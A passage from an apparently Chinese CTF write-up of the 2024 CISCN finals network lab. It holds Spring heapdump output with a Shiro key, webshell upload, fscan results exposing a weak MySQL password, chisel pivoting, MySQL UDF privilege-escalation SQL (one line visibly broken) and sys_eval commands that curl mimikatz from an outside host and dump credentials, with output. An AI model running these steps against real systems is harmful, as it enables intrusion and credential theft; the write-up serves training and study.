operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>MapPropertySources-------------local.server.port <span class="token operator">=</span> null<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>ConsulPropertySources-------------not found<span class="token operator">!</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>JavaProperties-------------java.util.logging.FileHandler.pattern <span class="token operator">=</span> %h/java%u.logawt.toolkit <span class="token operator">=</span> sun.awt.X11.XToolkitsun.cpu.isalist <span class="token operator">=</span>sun.jnu.encoding <span class="token operator">=</span> UTF-8java.class.path <span class="token operator">=</span> /opt/erp/ERPProject-0.0.1-SNAPSHOT.jarjdk.security.legacyAlgorithms <span class="token operator">=</span> SHA1, RSA keySize <span class="token operator">&lt;</span> <span class="token number">2048</span>, DSA keySize <span class="token operator">&lt;</span> <span class="token number">2048</span>java.vm.vendor <span class="token operator">=</span> Private Buildjdk.disabled.namedCurves <span class="token operator">=</span> secp112r1, secp112r2, secp128r1, secp128r2, secp160k1, secp160r1, secp160r2, secp192k1, secp192r1, secp224k1, secp224r1, secp256k1, sect113r1, sect113r2, sect131r1, sect131r2, sect163k1, sect163r1, sect163r2, sect193r1, sect193r2, sect233k1, sect233r1, sect239k1, sect283k1, sect283r1, sect409k1, sect409r1, sect571k1, sect571r1, X9.62 c2tnb191v1, X9.62 c2tnb191v2, X9.62 c2tnb191v3, X9.62 c2tnb239v1, X9.62 c2tnb239v2, X9.62 c2tnb239v3, X9.62 c2tnb359v1, X9.62 c2tnb431r1, X9.62 prime192v2, X9.62 prime192v3, X9.62 prime239v1, X9.62 prime239v2, X9.62 prime239v3, brainpoolP256r1, brainpoolP320r1, brainpoolP384r1, brainpoolP512r1crypto.policy <span class="token operator">=</span> unlimitedjceks.key.serialFilter <span class="token operator">=</span> java.lang.Enum<span class="token punctuation">;</span>java.security.KeyRep<span class="token punctuation">;</span>java.security.KeyRep<span class="token variable">$Type</span><span class="token punctuation">;</span>javax.crypto.spec.SecretKeySpec<span class="token punctuation">;</span><span class="token operator">!</span>*sun.arch.data.model <span class="token operator">=</span> <span class="token number">64</span>login.configuration.provider <span class="token operator">=</span> sun.security.provider.ConfigFilecatalina.useNaming <span class="token operator">=</span> <span class="token boolean">false</span>user.timezone <span class="token operator">=</span>security.overridePropertiesFile <span class="token operator">=</span> <span class="token boolean">true</span>java.vm.specification.version <span class="token operator">=</span> <span class="token number">1.8</span>os.name <span class="token operator">=</span> Linuxuser.country <span class="token operator">=</span> USsecurity.provider.7 <span class="token operator">=</span> com.sun.security.sasl.Providersun.boot.library.path <span class="token operator">=</span> /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/amd64sun.java.command <span class="token operator">=</span> /opt/erp/ERPProject-0.0.1-SNAPSHOT.jarsecurity.provider.9 <span class="token operator">=</span> sun.security.smartcardio.SunPCSCjdk.security.caDistrustPolicies <span class="token operator">=</span> SYMANTEC_TLSsun.cpu.endian <span class="token operator">=</span> littleuser.home <span class="token operator">=</span> /rootuser.language <span class="token operator">=</span> enjava.specification.vendor <span class="token operator">=</span> Oracle Corporationen <span class="token operator">=</span> UTF-8security.provider.1 <span class="token operator">=</span> sun.security.provider.Sunsecurity.provider.2 <span class="token operator">=</span> sun.security.rsa.SunRsaSignsecurity.provider.3 <span class="token operator">=</span> sun.security.ec.SunECnetworkaddress.cache.negative.ttl <span class="token operator">=</span> <span class="token number">10</span>jdk.tls.alpnCharset <span class="token operator">=</span> ISO_8859_1security.provider.4 <span class="token operator">=</span> com.sun.net.ssl.internal.ssl.Providersecurity.provider.5 <span class="token operator">=</span> com.sun.crypto.provider.SunJCEsecurity.provider.6 <span class="token operator">=</span> sun.security.jgss.SunProviderssl.KeyManagerFactory.algorithm <span class="token operator">=</span> SunX509file.separator <span class="token operator">=</span> /java.specification.name <span class="token operator">=</span> Java Platform API Specificationjava.vm.specification.vendor <span class="token operator">=</span> Oracle CorporationFILE_LOG_CHARSET <span class="token operator">=</span> UTF-8.level <span class="token operator">=</span> INFOjava.awt.graphicsenv <span class="token operator">=</span> sun.awt.X11GraphicsEnvironmentja <span class="token operator">=</span> UTF-8java.awt.headless <span class="token operator">=</span> <span class="token boolean">true</span>com.xyz.foo.level <span class="token operator">=</span> SEVEREpackage.definition <span class="token operator">=</span> sun.,com.sun.xml.internal.,com.sun.imageio.,com.sun.istack.internal.,com.sun.jmx.,com.sun.media.sound.,com.sun.naming.internal.,com.sun.proxy.,com.sun.corba.se.,com.sun.org.apache.bcel.internal.,com.sun.org.apache.regexp.internal.,com.sun.org.apache.xerces.internal.,com.sun.org.apache.xpath.internal.,com.sun.org.apache.xalan.internal.extensions.,com.sun.org.apache.xalan.internal.lib.,com.sun.org.apache.xalan.internal.res.,com.sun.org.apache.xalan.internal.templates.,com.sun.org.apache.xalan.internal.utils.,com.sun.org.apache.xalan.internal.xslt.,com.sun.org.apache.xalan.internal.xsltc.cmdline.,com.sun.org.apache.xalan.internal.xsltc.compiler.,com.sun.org.apache.xalan.internal.xsltc.trax.,com.sun.org.apache.xalan.internal.xsltc.util.,com.sun.org.apache.xml.internal.res.,com.sun.org.apache.xml.internal.resolver.helpers.,com.sun.org.apache.xml.internal.resolver.readers.,com.sun.org.apache.xml.internal.security.,com.sun.org.apache.xml.internal.serializer.utils.,com.sun.org.apache.xml.internal.utils.,com.sun.org.glassfish.,com.oracle.xmlns.internal.,com.oracle.webservices.internal.,oracle.jrockit.jfr.,org.jcp.xml.dsig.internal.,jdk.internal.,jdk.nashorn.internal.,jdk.nashorn.tools.,jdk.xml.internal.,com.sun.activation.registries.,jdk.jfr.events.,jdk.jfr.internal.,jdk.management.jfr.internal.sun.boot.class.path <span class="token operator">=</span> /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/resources.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/rt.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/sunrsasign.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jsse.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jce.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/charsets.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jfr.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/classesjava.protocol.handler.pkgs <span class="token operator">=</span> org.springframework.boot.loadersun.management.compiler <span class="token operator">=</span> HotSpot <span class="token number">64</span>-Bit Tiered Compilersjava.runtime.version <span class="token operator">=</span> <span class="token number">1.8</span>.0_412-8u412-ga-1~20.04.1-b08policy.provider <span class="token operator">=</span> sun.security.provider.PolicyFileuser.name <span class="token operator">=</span> rootpolicy.url.1 <span class="token operator">=</span> file:<span class="token variable">$&#123;java.home&#125;</span>/lib/security/java.policypath.separator <span class="token operator">=</span> <span class="token builtin class-name">:</span>fr <span class="token operator">=</span> UTF-8securerandom.source <span class="token operator">=</span> file:/dev/randompolicy.url.2 <span class="token operator">=</span> file:<span class="token variable">$&#123;user.home&#125;</span>/.java.policyjdk.tls.disabledAlgorithms <span class="token operator">=</span> SSLv3, TLSv1, TLSv1.1, RC4, DES, MD5withRSA, DH keySize <span class="token operator">&lt;</span> <span class="token number">1024</span>, EC keySize <span class="token operator">&lt;</span> <span class="token number">224</span>, 3DES_EDE_CBC, anon, NULL, include jdk.disabled.namedCurvesos.version <span class="token operator">=</span> <span class="token number">5.4</span>.0-187-genericjava.endorsed.dirs <span class="token operator">=</span> /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/endorsedpolicy.ignoreIdentityScope <span class="token operator">=</span> <span class="token boolean">false</span>java.runtime.name <span class="token operator">=</span> OpenJDK Runtime Environmentkeystore.type.compat <span class="token operator">=</span> <span class="token boolean">true</span>file.encoding <span class="token operator">=</span> UTF-8spring.beaninfo.ignore <span class="token operator">=</span> <span class="token boolean">true</span>java.util.logging.ConsoleHandler.formatter <span class="token operator">=</span> java.util.logging.SimpleFormatterjava.vm.name <span class="token operator">=</span> OpenJDK <span class="token number">64</span>-Bit Server VMjdk.sasl.disabledMechanisms <span class="token operator">=</span>java.vendor.url.bug <span class="token operator">=</span> http://bugreport.sun.com/bugreport/java.io.tmpdir <span class="token operator">=</span> /tmpjava.util.logging.FileHandler.formatter <span class="token operator">=</span> java.util.logging.XMLFormatterjava.util.logging.FileHandler.count <span class="token operator">=</span> <span class="token number">1</span>catalina.home <span class="token operator">=</span> /tmp/tomcat.8080.4070673021461777528sun.cds.enableSharedLookupCache <span class="token operator">=</span> <span class="token boolean">false</span>java.version <span class="token operator">=</span> <span class="token number">1.8</span>.0_412sun.security.krb5.maxReferrals <span class="token operator">=</span> <span class="token number">5</span>jdk.tls.keyLimits <span class="token operator">=</span> AES/GCM/NoPadding KeyUpdate <span class="token number">2</span>^37java.vm.specification.name <span class="token operator">=</span> Java Virtual Machine SpecificationPID <span class="token operator">=</span> <span class="token number">589</span>java.awt.printerjob <span class="token operator">=</span> sun.print.PSPrinterJobCONSOLE_LOG_CHARSET <span class="token operator">=</span> UTF-8jdk.xml.dsig.secureValidationPolicy <span class="token operator">=</span> disallowAlg http://www.w3.org/TR/1999/REC-xslt-19991116,disallowAlg http://www.w3.org/2001/04/xmldsig-more<span class="token comment">#rsa-md5,disallowAlg http://www.w3.org/2001/04/xmldsig-more#hmac-md5,disallowAlg http://www.w3.org/2001/04/xmldsig-more#md5,maxTransforms 5,maxReferences 30,disallowReferenceUriSchemes file http https,minKeySize RSA 1024,minKeySize DSA 1024,minKeySize EC 224,noDuplicateIds,noRetrievalMethodLoops</span>catalina.base <span class="token operator">=</span> /tmp/tomcat.8080.4070673021461777528java.library.path <span class="token operator">=</span> /usr/java/packages/lib/amd64:/usr/lib/x86_64-linux-gnu/jni:/lib/x86_64-linux-gnu:/usr/lib/x86_64-linux-gnu:/usr/lib/jni:/lib:/usr/libjava.util.logging.FileHandler.limit <span class="token operator">=</span> <span class="token number">50000</span>java.vendor <span class="token operator">=</span> Private Buildjava.vm.info <span class="token operator">=</span> mixed modekeystore.type <span class="token operator">=</span> jksjava.specification.maintenance.version <span class="token operator">=</span> <span class="token number">5</span>handlers <span class="token operator">=</span> java.util.logging.ConsoleHandlerjava.ext.dirs <span class="token operator">=</span> /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/ext:/usr/java/packages/lib/extsun.io.unicode.encoding <span class="token operator">=</span> UnicodeLittlepolicy.expandProperties <span class="token operator">=</span> <span class="token boolean">true</span>securerandom.strongAlgorithms <span class="token operator">=</span> NativePRNGBlocking:SUNkrb5.kdc.bad.policy <span class="token operator">=</span> tryLast<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>ProcessEnvironment-------------not found<span class="token operator">!</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>OSS-------------not found<span class="token operator">!</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>UserPassSearcher-------------org.apache.shiro.web.filter.authc.FormAuthenticationFilter:<span class="token punctuation">[</span>failureKeyAttribute <span class="token operator">=</span> shiroLoginFailure, loginUrl <span class="token operator">=</span> /login, successUrl <span class="token operator">=</span> /, usernameParam <span class="token operator">=</span> username, passwordParam <span class="token operator">=</span> password<span class="token punctuation">]</span>org.apache.catalina.startup.Tomcat:<span class="token punctuation">[</span>hostname <span class="token operator">=</span> localhost<span class="token punctuation">]</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以在里面找到shiro密钥</p><p><code>algMode = GCM, key = 0f+dthGML0M572/nBElv8g==, algName = AES</code></p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721084057165.png" alt="image-20240721084057165"></p><p>然后上蚁剑马即可，flag在根目录下</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721084318969.png" alt="image-20240721084318969"></p><p>接下来以这个为跳板机，传个fscan扫一下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ ./fscan <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.8.146/24<span class="token number">192.168</span>.8.146:22 <span class="token function">open</span><span class="token number">192.168</span>.8.38:139 <span class="token function">open</span><span class="token number">192.168</span>.8.16:139 <span class="token function">open</span><span class="token number">192.168</span>.8.26:139 <span class="token function">open</span><span class="token number">192.168</span>.8.9:139 <span class="token function">open</span><span class="token number">192.168</span>.8.12:139 <span class="token function">open</span><span class="token number">192.168</span>.8.26:135 <span class="token function">open</span><span class="token number">192.168</span>.8.38:135 <span class="token function">open</span><span class="token number">192.168</span>.8.16:135 <span class="token function">open</span><span class="token number">192.168</span>.8.12:135 <span class="token function">open</span><span class="token number">192.168</span>.8.9:135 <span class="token function">open</span><span class="token number">192.168</span>.8.9:1433 <span class="token function">open</span><span class="token number">192.168</span>.8.38:445 <span class="token function">open</span><span class="token number">192.168</span>.8.26:445 <span class="token function">open</span><span class="token number">192.168</span>.8.16:445 <span class="token function">open</span><span class="token number">192.168</span>.8.12:445 <span class="token function">open</span><span class="token number">192.168</span>.8.9:445 <span class="token function">open</span><span class="token number">192.168</span>.8.42:80 <span class="token function">open</span><span class="token number">192.168</span>.8.42:22 <span class="token function">open</span><span class="token number">192.168</span>.8.26:8080 <span class="token function">open</span><span class="token number">192.168</span>.8.16:8080 <span class="token function">open</span><span class="token number">192.168</span>.8.146:8080 <span class="token function">open</span><span class="token number">192.168</span>.8.9:8000 <span class="token function">open</span><span class="token number">192.168</span>.8.9:80 <span class="token function">open</span><span class="token number">192.168</span>.8.38:3306 <span class="token function">open</span><span class="token number">192.168</span>.8.12:88 <span class="token function">open</span><span class="token number">192.168</span>.8.42:8060 <span class="token function">open</span><span class="token number">192.168</span>.8.9:8172 <span class="token function">open</span><span class="token number">192.168</span>.8.42:9094 <span class="token function">open</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetBios <span class="token number">192.168</span>.8.9     WORKGROUP<span class="token punctuation">\</span>WIN-IISSERER        <span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetBios <span class="token number">192.168</span>.8.26    WORKGROUP<span class="token punctuation">\</span>WIN-PC3788          <span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetBios <span class="token number">192.168</span>.8.12    <span class="token punctuation">[</span>+<span class="token punctuation">]</span> DC:VERTEXSOFT<span class="token punctuation">\</span>RODC         <span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetBios <span class="token number">192.168</span>.8.38    WORKGROUP<span class="token punctuation">\</span>WIN-OPS88           <span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetBios <span class="token number">192.168</span>.8.16    WORKGROUP<span class="token punctuation">\</span>WIN-SERVER03        <span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://192.168.8.42:8060  code:404 len:555    title:404 Not Found<span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetInfo <span class="token punctuation">[</span>*<span class="token punctuation">]</span><span class="token number">192.168</span>.8.12   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span>RODC   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span><span class="token number">192.168</span>.8.12<span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetInfo <span class="token punctuation">[</span>*<span class="token punctuation">]</span><span class="token number">192.168</span>.8.38   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span>WIN-OPS88   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span><span class="token number">192.168</span>.8.38<span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetInfo <span class="token punctuation">[</span>*<span class="token punctuation">]</span><span class="token number">192.168</span>.8.26   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span>WIN-PC3788   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span><span class="token number">192.168</span>.8.26<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://192.168.8.9:8000   code:200 len:4018   title:Modbus Monitor - VertexSoft Internal Attendance System<span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetInfo <span class="token punctuation">[</span>*<span class="token punctuation">]</span><span class="token number">192.168</span>.8.9   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span>WIN-IISSERER   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span><span class="token number">192.168</span>.8.9<span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetInfo <span class="token punctuation">[</span>*<span class="token punctuation">]</span><span class="token number">192.168</span>.8.16   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span>WIN-SERVER03   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span><span class="token number">192.168</span>.8.16<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://192.168.8.146:8080 code:302 len:0      title:None 跳转url: http://192.168.8.146:8080/login<span class="token punctuation">;</span><span class="token assign-left variable">jsessionid</span><span class="token operator">=</span>6FF5708E4EEFFF8BDFC2934D53AC7C8F<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://192.168.8.146:8080/login<span class="token punctuation">;</span><span class="token assign-left variable">jsessionid</span><span class="token operator">=</span>6FF5708E4EEFFF8BDFC2934D53AC7C8F code:200 len:1383   title:Master ERP login Form<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://192.168.8.42       code:302 len:99     title:None 跳转url: http://192.168.8.42/users/sign_in<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://192.168.8.26:8080  code:200 len:147    title:第一个 JSP 程序<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://192.168.8.9        code:200 len:43679  title:VertexSoft<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle https://192.168.8.9:8172  code:404 len:0      title:None<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://192.168.8.16:8080  code:403 len:594    title:None<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://192.168.8.42/users/sign_in code:200 len:11166  title:登录 · GitLab<span class="token punctuation">[</span>+<span class="token punctuation">]</span> PocScan http://192.168.8.146:8080 poc-yaml-spring-actuator-heapdump-file <span class="token punctuation">[</span>+<span class="token punctuation">]</span> PocScan http://192.168.8.146:8080 poc-yaml-springboot-env-unauth spring2<span class="token punctuation">[</span>+<span class="token punctuation">]</span> mysql <span class="token number">192.168</span>.8.38:3306:root <span class="token number">123456</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="WIN-OPS88"><a href="#WIN-OPS88" class="headerlink" title="WIN-OPS88"></a>WIN-OPS88</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetInfo <span class="token punctuation">[</span>*<span class="token punctuation">]</span><span class="token number">192.168</span>.8.38   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span>WIN-OPS88   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span><span class="token number">192.168</span>.8.38<span class="token punctuation">[</span>+<span class="token punctuation">]</span> mysql <span class="token number">192.168</span>.8.38:3306:root <span class="token number">123456</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>做chisel代理把WIN-OPS88的数据库端口转发出来（其实可以直接做sockets代理出所有的内网ip，巨魔教的）</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721095403405.png" alt="image-20240721095403405"></p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721095424140.png" alt="image-20240721095424140"></p><p>既然有账密，那么直接sql连上去，数据库里没别的东西</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721225527342.png" alt="image-20240721225527342"></p><p>尝试udf提权，注意是win64的payload（这里我看别人直接用mdut工具一把梭了）</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">show</span> variables <span class="token operator">like</span> <span class="token string">"%plugin%"</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token number">span> <span class="token keyword">INTO</span> <span class="token keyword">DUMPFILE</span> <span class="token string">"C:\\Program Files\\MySQL\\MySQL Server 8.0\\lib\\plugin\\udf.so"</span><span class="token punctuation">;</span><span class="token keyword">CREATE</span> <span class="token keyword">FUNCTION</span> sys_eval <span class="token keyword">RETURNS</span> STRING <span class="token keyword">SONAME</span> <span class="token string">"udf.so"</span><span class="token punctuation">;</span><span class="token keyword">select</span> sys_eval<span class="token punctuation">(</span><span class="token string">"type C:\\Users\\Administrator\\flag\\flag.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>读到flag</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721095325681.png" alt="image-20240721095325681"></p><p>接下来尝试丢mimikatz收集信息（实际无用）</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> sys_eval<span class="token punctuation">(</span><span class="token string">"curl  http://192.168.36.88:8080/mimikatz.exe -o mimikatz.exe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">select</span> sys_eval<span class="token punctuation">(</span><span class="token string">'"mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords" "exit" > test.txt"'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">select</span> sys_eval<span class="token punctuation">(</span><span class="token string">'"mimikatz.exe "privilege::debug" "log" "lsadump::dcsync /user:Administrator" "exit" > test.txt"'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">select</span> sys_eval<span class="token punctuation">(</span><span class="token string">'"mimikatz.exe "privilege::debug" "log" "creds_all" "exit" > test.txt"'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \ / ##       > https://blog.gentilkiwi.com/mimikatz '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/mimikatz(commandline) # privilege::debugPrivilege '20' OKmimikatz(commandline) # logUsing 'mimikatz.log' for logfile : OKmimikatz(commandline) # sekurlsa::logonpasswordsAuthentication Id : 0 ; 68033 (00000000:000109c1)Session           : Interactive from 1User Name         : DWM-1Domain            : Window ManagerLogon Server      : (null)Logon Time        : 7/21/2024 6:17:47 AMSID               : S-1-5-90-0-1msv :tspkg :wdigest : * Username : WIN-OPS88$ * Domain   : WORKGROUP * Password : (null)kerberos :ssp :credman :cloudap :Authentication Id : 0 ; 996 (00000000:000003e4)Session           : Service from 0User Name         : WIN-OPS88$Domain            : WORKGROUPLogon Server      : (null)Logon Time        : 7/21/2024 6:17:47 AMSID               : S-1-5-20msv :tspkg :wdigest : * Username : WIN-OPS88$ * Domain   : WORKGROUP * Password : (null)kerberos : * Username : win-ops88$ * Domain   : WORKGROUP * Password : (null)ssp :credman :cloudap :Authentication Id : 0 ; 31473 (00000000:00007af1)Session           : Interactive from 0User Name         : UMFD-0Domain            : Font Driver HostLogon Server      : (null)Logon Time        : 7/21/2024 6:17:47 AMSID               : S-1-5-96-0-0msv :tspkg :wdigest : * Username : WIN-OPS88$ * Domain   : WORKGROUP * Password : (null)kerberos :ssp :credman :cloudap :Authentication Id : 0 ; 68016 (00000000:000109b0)Session           : Interactive from 1User Name         : DWM-1Domain            : Window ManagerLogon Server      : (null)Logon Time        : 7/21/2024 6:17:47 AMSID               : S-1-5-90-0-1msv :tspkg :wdigest : * Username : WIN-OPS88$ * Domain   : WORKGROUP * Password : (null)kerberos :ssp :credman :cloudap :Authentication Id : 0 ; 997 (00000000:000003e5)Session           : Service from 0User Name         : LOCAL SERVICEDomain            : NT AUTHORITYLogon Server      : (null)Logon Time        : 7/21/2024 6:17:47 AMSID               : S-1-5-19msv :tspkg :wdigest : * Username : (null) * Domain   : (null) * Password : (null)kerberos : * Username : (null) * Domain   : (null) * Password : (null)ssp :credman :cloudap :Authentication Id : 0 ; 31470 (00000000:00007aee)Session           : Interactive from 1User Name         : 